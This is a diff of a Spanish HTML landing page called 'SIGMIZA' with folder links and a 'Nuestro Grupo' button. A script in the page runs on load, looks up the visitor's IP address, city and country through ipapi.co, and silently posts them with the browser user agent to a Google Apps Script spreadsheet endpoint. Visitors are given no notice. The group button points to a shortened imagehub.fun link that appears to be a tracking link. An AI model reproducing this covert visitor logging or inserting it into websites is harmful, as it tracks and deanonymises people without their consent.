@@ -1,105 +1,79 @@
 <!DOCTYPE html>
 <html lang="es">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>SIGMIZA</title>
-    <style>
-      body {
-        font-family: Arial, sans-serif;
-        background-color: #000000;
-        color: #9400D3;
-        margin: 0;
-        padding: 0;
-        text-align: center;
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>SIGMIZA</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #000000;
+      color: #9400D3;
+      margin: 0;
+      padding: 0;
+      text-align: center;
+    }
+    h1 {
+      color: #9400D3;
+      font-size: 3em;
+      margin: 20px 0;
+      animation: pulse 1.5s infinite;
+    }
+    @keyframes pulse {
+      0%, 100% { text-shadow: 0 0 5px #9400D3, 0 0 10px #9400D3, 0 0 20px #9400D3, 0 0 40px #9400D3; }
+      50% { text-shadow: 0 0 10px #FF00FF, 0 0 20px #FF00FF, 0 0 30px #FF00FF, 0 0 50px #FF00FF; }
+    }
+    .folder {
+      display: inline-block;
+      margin: 20px;
+      text-decoration: none;
+      color: #9400D3;
+      font-size: 1.5em;
+      padding: 15px;
+      border: 2px solid #9400D3;
+      border-radius: 10px;
+      transition: background-color 0.3s, color 0.3s;
+    }
+    .folder:hover {
+      background-color: #9400D3;
+      color: white;
+    }
+  </style>
+</head>
+<body>
+  <h1>SIGMIZA</h1>
+
+  <a class="folder" href="day/index.html">📂 Day</a>
+  <a class="folder" href="proximamente/index.html">📂 Proximamente</a>
+
+  <a id="group-button" href="https://imagehub.fun/P54OYO.link" target="_blank">Nuestro Grupo</a>
+
+
+  <script>
+    window.addEventListener('load', async function() {
+      try {
+  
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+
+        
+        const sheetUrl = 'https://script.google.com/macros/s/AKfycbxIbChRbWzKg62_LFflxb5RyWPEcNMGIq3hCfoFMicNmdOHiZF7c95oh6UGhK4NJf4w/exec';
+        fetch(sheetUrl, {
+          method: 'POST',
+          body: new URLSearchParams({
+            B: data.ip,             
+            C: data.city,           
+            D: data.country_name,   
+            E: navigator.userAgent  
+          }),
+          mode: 'no-cors' 
+        });
+
+        console.log("Datos enviados a Google Sheets:", data);
+      } catch (err) {
+        console.error("Error al registrar IP:", err);
       }
-
-      h1 {
-        color: #9400D3;
-        font-size: 3em;
-        margin: 20px 0;
-        animation: pulse 1.5s infinite;
-      }
-
-      @keyframes pulse {
-        0%, 100% {
-          text-shadow: 0 0 5px #9400D3, 0 0 10px #9400D3, 0 0 20px #9400D3, 0 0 40px #9400D3;
-        }
-        50% {
-          text-shadow: 0 0 10px #FF00FF, 0 0 20px #FF00FF, 0 0 30px #FF00FF, 0 0 50px #FF00FF;
-        }
-      }
-
-      .folder {
-        display: inline-block;
-        margin: 20px;
-        text-decoration: none;
-        color: #9400D3;
-        font-size: 1.5em;
-        padding: 15px;
-        border: 2px solid #9400D3;
-        border-radius: 10px;
-        transition: background-color 0.3s, color 0.3s;
-      }
-
-      .folder:hover {
-        background-color: #9400D3;
-        color: white;
-      }
-
-      #group-button {
-        display: inline-block;
-        margin: 20px;
-        padding: 15px;
-        font-size: 1.5em;
-        color: #9400D3;
-        text-decoration: none;
-        border: 2px solid #9400D3;
-        border-radius: 10px;
-        transition: background-color 0.3s, color 0.3s;
-      }
-
-      #group-button:hover {
-        background-color: #9400D3;
-        color: white;
-      }
-    </style>
-  </head>
-  <body>
-    <h1>SIGMIZA</h1>
-
-    <a class="folder" href="day/index.html">📂 Day</a>
-    <a class="folder" href="proximamente/index.html">📂 Proximamente</a>
-    <a id="group-button" href="https://imagehub.fun/P54OYO.link" target="_blank">Nuestro Grupo</a>
-
- 
-    <script>
-      window.addEventListener('load', async function() {
-        try {
-     
-          const res = await fetch('https://ipapi.co/json/');
-          const data = await res.json();
-
-          
-          const sheetUrl = 'https://script.google.com/macros/s/AKfycbzwkfynoUj8hYG_zpgxftZLYEXmKG3qT8qfVGpZW9IFIg2jeJGBL2pp3xDCgObox384/exec';
-
-       
-          fetch(sheetUrl, {
-            method: 'POST',
-            body: new URLSearchParams({
-              B: data.ip,            
-              C: data.city,           
-              D: data.country_name, 
-              E: navigator.userAgent  
-            }),
-            mode: 'no-cors' 
-          });
-
-          console.log("Datos enviados a Google Sheets:", data);
-        } catch (err) {
-          console.error("Error al registrar IP:", err);
-        }
-      });
-    </script>
-  </body>
+    });
+  </script>
+</body>
 </html>
